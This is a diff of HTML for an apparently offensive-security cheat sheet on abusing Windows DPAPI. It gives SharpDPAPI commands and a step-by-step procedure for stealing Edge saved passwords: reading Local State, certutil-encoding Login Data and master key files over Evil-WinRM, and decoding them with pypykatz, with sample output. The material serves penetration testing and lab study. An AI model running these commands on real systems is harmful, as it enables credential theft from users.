+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user <span class="o">(</span>without password<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe credentials /rpc
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\SharpDPAPI.exe credentials /rpc
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\SharpDPAPI.exe credentials /rpc
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  __                 _   _       _ ___ 
 </span></span></span><span class="line"><span class="cl"><span class="go"> (_  |_   _. ._ ._  | \ |_) /\  |_) |  
@@ -867,37 +856,45 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SharpDPAPI completed in 00:00:00.1707869
-</span></span></span></code></pre></div></div>
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab3"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as system
+</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- 'machinetriage'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user
+</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- 'credentials /password:<span class="o">&lt;PASSWORD&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user <span class="o">(</span>without password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- 'credentials /rpc'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
 
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as system
-</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- &#39;machinetriage&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user
-</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- &#39;credentials /password:&lt;PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user <span class="o">(</span>without password<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- &#39;credentials /rpc&#39;
-</span></span></span></code></pre></div></div></p>
+
+
+<p></p>
 <hr>
 <h3 id="abuse-2-browser-saved-creds">Abuse #2: Browser Saved Creds</h3>
-<p>
-<button data-tabset="set3" data-tabcontent="tab1" >Offline</button>
+<p class="tabs">
+<button data-tabset="set3" data-tabcontent="tab1" class="active">Offline</button>
 
-<button data-tabset="set3" data-tabcontent="tab2" >Auto</button>
+<button data-tabset="set3" data-tabcontent="tab2">Auto</button>
 
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-prepare-logindata-and-localstate-file">1. Prepare logindata and localstate file</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Local State json file, copy and paste to <span class="nb">local</span> Linux
-</span></span><span class="line"><span class="cl"><span class="go">type &#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Local State&#34;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type &#34;C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Local State&#34;
+</p><div class="tabset-wrapper" data-tabset-group="set3"><div class="tabcontent active" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-prepare-logindata-and-localstate-file">1. Prepare logindata and localstate file</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Local State json file, copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type "C:\Users\<span class="o">&lt;USER&gt;</span>\appdata\local\microsoft\edge\User Data\Local State"
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type "C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Local State"
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">{&#34;abusive_adblocker_etag&#34;:&#34;\&#34;1651629182\&#34;&#34;,...[SNIP]...,&#34;web_widget&#34;:{&#34;disabled_due_extensions&#34;:false}}
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Login Data binary file
-</span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Default\Login Data&#34; C:\ProgramData\logindata
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; certutil -encode &#34;C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Default\Login Data&#34; C:\ProgramData\logindata
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">{"abusive_adblocker_etag":"\"1651629182\"",...[SNIP]...,"web_widget":{"disabled_due_extensions":false}}
+</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Login Data binary file
+</span></span><span class="line"><span class="cl"><span class="go">certutil -encode "C:\Users\<span class="o">&lt;USER&gt;</span>\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\ProgramData\logindata
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; certutil -encode "C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\ProgramData\logindata
 </span></span></span><span class="line"><span class="cl"><span class="go">Input Length = 55296
 </span></span></span><span class="line"><span class="cl"><span class="go">Output Length = 76088
 </span></span></span><span class="line"><span class="cl"><span class="go">CertUtil: -encode command completed successfully.
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux <span class="o">(</span>Exclude BEGIN and END CERTIFIATE<span class="o">)</span>
+</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux <span class="o">(</span>Exclude BEGIN and END CERTIFIATE<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\logindata
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type C:\ProgramData\logindata
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type C:\ProgramData\logindata
 </span></span></span><span class="line"><span class="cl"><span class="go">-----BEGIN CERTIFICATE-----
 </span></span></span><span class="line"><span class="cl"><span class="go">U1FMaXRlIGZvcm1hdCAzAAgAAQEAQCAgAAAAAgAAABsAAAAAAAAAAAAAABAAAAAE
 </span></span></span><span class="line"><span class="cl"><span class="go">AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
@@ -905,32 +902,37 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </span></span></span><span class="line"><span class="cl"><span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </span></span></span><span class="line"><span class="cl"><span class="go">-----END CERTIFICATE-----
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
+</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
 </span></span><span class="line"><span class="cl"><span class="go">cat logindata_b64 | base64 -d &gt; logindata
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat logindata_b64 <span class="p">|</span> base64 -d &gt; logindata
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract key from <span class="nb">local</span> state
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> cat logindata_b64 <span class="p">|</span> base64 -d &gt; logindata
+</span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract key from <span class="nb">local</span> state
 </span></span><span class="line"><span class="cl"><span class="go">cat localstate.json | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- &gt; blob
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat localstate.json <span class="p">|</span> jq -r .os_crypt.encrypted_key <span class="p">|</span> base64 -d <span class="p">|</span> cut -c6- &gt; blob
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get masterkey_guid
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> cat localstate.json <span class="p">|</span> jq -r .os_crypt.encrypted_key <span class="p">|</span> base64 -d <span class="p">|</span> cut -c6- &gt; blob
+</span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get masterkey_guid
 </span></span><span class="line"><span class="cl"><span class="go">pypykatz dpapi describe blob blob
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi describe blob blob
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi describe blob blob
 </span></span><span class="line"><span class="cl"><span class="go">== DPAPI_BLOB ==
 </span></span></span><span class="line"><span class="cl"><span class="go">version: 1 
-</span></span></span><span class="line"><span class="cl"><span class="go">credential_guid: b&#39;\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb&#39; 
+</span></span></span><span class="line"><span class="cl"><span class="go">credential_guid: b'\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb' 
 </span></span></span><span class="line"><span class="cl"><span class="go">masterkey_version: 1 
 </span></span></span><span class="line"><span class="cl"><span class="go">masterkey_guid: a8bd1009-f2ac-43ca-9266-8e029f503e11 
 </span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/skelsec/pypykatz">pypykatz</a></em></small></p>
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/skelsec/pypykatz">pypykatz</a></em></small></p>
 <h4 id="2-retrieve-keys">2. Retrieve Keys</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get master key
-</span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt;&#34; C:\ProgramData\&lt;MASTERKEY_GUID&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; certutil -encode &#34;C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761\a8bd1009-f2ac-43ca-9266-8e029f503e11 &#34; C:\ProgramData\a8bd1009-f2ac-43ca-9266-8e029f503e11
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get master key
+</span></span><span class="line"><span class="cl"><span class="go">certutil -encode "C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Protect\<span class="o">&lt;SID&gt;</span>\<span class="o">&lt;MASTERKEY_GUID&gt;</span>" C:\ProgramData\<span class="o">&lt;MASTERKEY_GUID&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; certutil -encode "C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761\a8bd1009-f2ac-43ca-9266-8e029f503e11 " C:\ProgramData\a8bd1009-f2ac-43ca-9266-8e029f503e11
 </span></span></span><span class="line"><span class="cl"><span class="go">Input Length = 740
 </span></span></span><span class="line"><span class="cl"><span class="go">Output Length = 1076
 </span></span></span><span class="line"><span class="cl"><span class="go">CertUtil: -encode command completed successfully.
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
-</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\&lt;MASTERKEY_GUID&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type C:\ProgramData\a8bd1009-f2ac-43ca-9266-8e029f503e11
+</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\<span class="o">&lt;MASTERKEY_GUID&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type C:\ProgramData\a8bd1009-f2ac-43ca-9266-8e029f503e11
 </span></span></span><span class="line"><span class="cl"><span class="go">-----BEGIN CERTIFICATE-----
 </span></span></span><span class="line"><span class="cl"><span class="go">AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
 </span></span></span><span class="line"><span class="cl"><span class="go">LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
@@ -939,26 +941,29 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
 </span></span></span><span class="line"><span class="cl"><span class="go">29h5Ie/21Ms2D8kNzPms0rzLbXA=
 </span></span></span><span class="line"><span class="cl"><span class="go">-----END CERTIFICATE-----
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
